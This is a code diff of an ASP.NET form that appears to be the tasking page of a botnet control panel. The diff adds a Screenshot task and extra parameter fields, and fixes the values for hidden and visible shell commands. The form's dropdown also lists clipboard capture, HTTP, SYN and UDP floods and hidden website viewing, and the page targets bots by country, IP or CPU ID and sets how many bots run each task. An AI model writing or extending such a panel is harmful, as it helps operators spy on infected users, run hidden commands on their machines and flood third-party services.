@@ -171,9 +171,10 @@
                     <asp:Label ID="lblDropdown" runat="server" Text="Task"></asp:Label>
                             </td>
                             <td>
-                    <asp:DropDownList ID="ddTask" runat="server" AppendDataBoundItems="True" DataTextField="name" DataValueField="divisionid" Height="35px" Width="260px">
+                    <asp:DropDownList ID="ddTask" runat="server" AppendDataBoundItems="True" DataTextField="name" DataValueField="divisionid" Height="35px" Width="260px" OnSelectedIndexChanged="ddTask_SelectedIndexChanged" AutoPostBack="True">
                         <asp:ListItem Value="0" disabled selected hidden >Nothing selected</asp:ListItem>
                         <asp:ListItem Value="clipboard">Clipboard Manager</asp:ListItem>
+                        <asp:ListItem Value="screenshot">Screenshot</asp:ListItem>
                         <asp:ListItem Value="http">HTTP Flood</asp:ListItem>
                         <asp:ListItem Value="syn">SYN Flood</asp:ListItem>
                         <asp:ListItem Value="udp">UDP Flood</asp:ListItem>
@@ -187,31 +188,55 @@
                         <asp:ListItem Value="uninstall">Uninstall</asp:ListItem>
                         <asp:ListItem Value="viewhidden">View Website (Hidden)</asp:ListItem>
                         <asp:ListItem Value="viewvisable">View Website (Visible)</asp:ListItem>
-                        <asp:ListItem Value="shellvisable">Shell Command (Hidden)</asp:ListItem>
-                        <asp:ListItem>Shell Command (Visible)</asp:ListItem>
+                        <asp:ListItem Value="shellhidden">Shell Command (Hidden)</asp:ListItem>
+                        <asp:ListItem Value="shellvisable">Shell Command (Visible)</asp:ListItem>
                     </asp:DropDownList>
                             </td>
+                            <td class="auto-style2">
+                                <asp:Label ID="lblPar1" runat="server" Text="Amount" Visible="False" ></asp:Label>
+                            </td>
+                            <td>
+                                <asp:TextBox ID="txtPar1" runat="server" placeholder="Amount of bots to run Task" Width="530px" Height="30px" Visible="False"></asp:TextBox>
+                            </td>
                         </tr>
                         <tr>
                             <td class="auto-style2">
-                    <asp:Label ID="lblFilter" runat="server" Text="Filter"></asp:Label>
+                                <asp:Label ID="lblFilter" runat="server" Text="Filter"></asp:Label>
                             </td>
                             <td>
-                    <asp:TextBox ID="txtFilter" runat="server" placeholder="Example: US, 127.0.0.1, BFEBFBFF000306C3" Width="530px" Height="30px"></asp:TextBox>
+                                <asp:TextBox ID="txtFilter" runat="server" placeholder="Example: US, 127.0.0.1, BFEBFBFF000306C3" Width="530px" Height="30px"></asp:TextBox>
+                            </td>
+                            <td class="auto-style2">
+                                <asp:Label ID="lblPar2" runat="server" Text="Amount" Visible="False"></asp:Label>
+                            </td>
+                            <td>
+                                <asp:TextBox ID="txtPar2" runat="server" placeholder="Amount of bots to run Task" Width="530px" Height="30px" Visible="False"></asp:TextBox>
                             </td>
                         </tr>
                         <tr>
                             <td class="auto-style2">
-                    <asp:Label ID="lblAmount" runat="server" Text="Amount"></asp:Label>
+                                <asp:Label ID="lblAmount" runat="server" Text="Amount"></asp:Label>
                             </td>
                             <td>
-                    <asp:TextBox ID="txtAmount" runat="server" placeholder="Amount of bots to run Task" Width="530px" Height="30px"></asp:TextBox>
+                                <asp:TextBox ID="txtAmount" runat="server" placeholder="Amount of bots to run Task" Width="530px" Height="30px"></asp:TextBox>
+                            </td>
+                            <td class="auto-style2">
+                                <asp:Label ID="lblPar3" runat="server" Text="Amount" Visible="False"></asp:Label>
+                            </td>
+                            <td>
+                                <asp:TextBox ID="txtPar3" runat="server" placeholder="Amount of bots to run Task" Width="530px" Height="30px" Visible="False"></asp:TextBox>
                             </td>
                         </tr>
                         <tr>
                             <td class="auto-style2">&nbsp;</td>
                             <td>
                     <asp:Button ID="btnSubmit" cssClass="color2" runat="server" Text="SUBMIT" OnClick="btnSubmit_Click" UseSubmitBehavior="False" />
+                            </td>
+                            <td class="auto-style2">
+                                <asp:Label ID="lblPar4" runat="server" Text="Amount" Visible="False"></asp:Label>
+                            </td>
+                            <td>
+                                <asp:TextBox ID="txtPar4" runat="server" placeholder="Amount of bots to run Task" Width="530px" Height="30px" Visible="False"></asp:TextBox>
                             </td>
                         </tr>
                     </table>
